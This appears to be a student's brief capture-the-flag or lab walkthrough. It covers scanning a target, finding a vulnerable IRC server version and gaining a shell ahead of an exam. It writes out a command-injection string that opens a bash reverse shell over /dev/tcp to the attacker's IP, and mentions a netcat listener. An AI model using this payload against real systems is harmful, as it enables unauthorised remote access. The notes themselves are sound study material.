Step 1 (Scanning)
- target was validated using ICMP (ping)
- target was scanned using nmap
- target was re-scanned using nmap

Step 2 (Enumeration)
- target has HTTP and IRC
- HTTP page only contains info that IRC is being configured
- searching for RFC IRC for more information we see the requirnments for connecting to an IRC is 'PASS,NICK,USER'
- connecting to the IRC we see a version number which appears to be vulnerable as shown through searchsploit
 
Step 3 (Gaining access)
- looking into the metasploit script for the vulnerability we see the only thing it does is send to the target 
'"AB;" + payload.encoded + "\n"' with AB being the first input given to the program, payload encoded being our bash reverse shell and \n being 'new line' which means end current line/ function.
- 'echo "AB; bash -c 'bash -i >& /dev/tcp/<ip address of attacker>/<port> 0>&1'" ' will execute reverse shell on target
- set up nc listener on attacker

Remainder is steganography so i will continue after my exam attempt.
